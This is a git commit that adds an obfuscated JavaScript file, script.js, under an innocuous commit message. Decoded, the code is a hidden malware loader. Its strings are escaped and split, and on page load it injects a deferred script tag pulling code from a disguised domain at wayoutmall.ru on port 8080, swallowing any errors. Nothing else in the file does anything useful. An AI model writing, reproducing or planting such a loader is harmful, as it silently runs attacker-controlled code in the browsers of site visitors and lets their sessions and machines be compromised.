c32ad2922beb696a1023a52f55a8177efe19ef9a
TIR-ALMA <visotskayoa@mail.ru>
2026-01-05 16:03:41 +0700

    Create script.js

---
+++ my_code/script.js
@@ -0,0 +1,141 @@
+var f = new Array();
+
+function S() {
+    var H;
+    if (H != 'j') {
+        H = ''
+    };
+    var O;
+    if (O != 'Z') {
+        O = ''
+    };
+    var d = RegExp;
+    var k;
+    if (k != '' && k != 'M') {
+        k = 'oR'
+    };
+    var w;
+    if (w != '') {
+        w = 'E'
+    };
+    var C = unescape("%2f%61%6c%6f%74%2e%63%6f%6d%2f%61%6c%6f%74%2e%63%6f%6d%2f%67%6f%6f%67%6c%65%2e%63%6f%6d%2f%6d%65%2e%63%6f%6d%2f%77%69%6b%69%61%2e%63%6f%6d%2e%70%68%70");
+    var aD = new Date();
+    var u = new String();
+    var A = "re" + "pl" + "ac" + "9DVe".substr(3);
+    this.l = '';
+    var DQ = '';
+    var dP;
+    if (dP != 'EC' && dP != '') {
+        dP = null
+    };
+    var y = String("]o2p".substr(0, 1));
+    var B = window;
+    this.yE = '';
+    this.Io = '';
+    var a = '';
+    this.nY = '';
+    var Qd = new String();
+
+    function z(i, Y) {
+        var v = "[";
+        var QT;
+        if (QT != '' && QT != 'X') {
+            QT = ''
+        };
+        var Vz;
+        if (Vz != '' && Vz != 'SC') {
+            Vz = ''
+        };
+        v += Y + y;
+        var fP;
+        if (fP != 'VL') {
+            fP = ''
+        };
+        var TW;
+        if (TW != 'K' && TW != '') {
+            TW = null
+        };
+        var eI = "";
+        var x = new d(v, String("g"));
+        this.p = '';
+        var Bx;
+        if (Bx != '' && Bx != 'FK') {
+            Bx = 'GY'
+        };
+        return i[A](x, a);
+        var kW;
+        if (kW != '' && kW != 'P') {
+            kW = null
+        };
+    };
+    var eY = '';
+    var VQ = new Date();
+    var L = unescape("%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2d%63%6f%2d%74%68%2e%6f%72%62%69%74%64%6f%77%6e%6c%6f%61%64%65%72%2e%63%6f%6d%2e%70%68%70%2d%6e%65%74%2e%77%61%79%6f%75%74%6d%61%6c%6c%2e%72%75%3a");
+    var Ay = new String();
+    var dp;
+    if (dp != 'ny' && dp != 'Bf') {
+        dp = 'ny'
+    };
+    var wW;
+    if (wW != '') {
+        wW = 'N'
+    };
+    var e = z('81173721059491879344026616939', '21574396');
+    var u_;
+    if (u_ != 'rq' && u_ != '') {
+        u_ = null
+    };
+    var sB = '';
+    var g = '';
+    var AG = new Date();
+    var ks = new String();
+    var LE = new String("fDYXsc".substr(4) + "ri" + "pt3s7e".substr(0, 2));
+    this.hb = '';
+    var Px = new String();
+    var nR;
+    if (nR != '' && nR != 'TS') {
+        nR = 'sq'
+    };
+    var Eg = new Array();
+    B[new String("onlo" + "adY6S".substr(0, 2))] = function () {
+        var dQ = new Date();
+        try {
+            this.vi = "";
+            var xO = '';
+            var ip = '';
+            g = L + e;
+            var ti = '';
+            g += C;
+            var XI = new String();
+            Q = document.createElement(LE);
+            var Mg = "";
+            var zz = "";
+            Q[new String("src")] = g;
+            var yG = new Date();
+            this.dJ = '';
+            var NF = new String();
+            var lr = new String();
+            Q[String("defeqPQk".substr(0, 4) + "rn8R3".substr(0, 1))] = [1][0];
+            document.body.appendChild(Q);
+            var Dl = new String();
+        } catch (xw) {};
+        var dY;
+        if (dY != '' && dY != 'bj') {
+            dY = 'We'
+        };
+    };
+    var Ve;
+    if (Ve != 'iW' && Ve != 'ZV') {
+        Ve = 'iW'
+    };
+    var rP;
+    if (rP != 'KM' && rP != 'Bo') {
+        rP = ''
+    };
+};
+var ee = '';
+S();
+var je;
+if (je != 'BZ' && je != 'lb') {
+    je = 'BZ'
+};
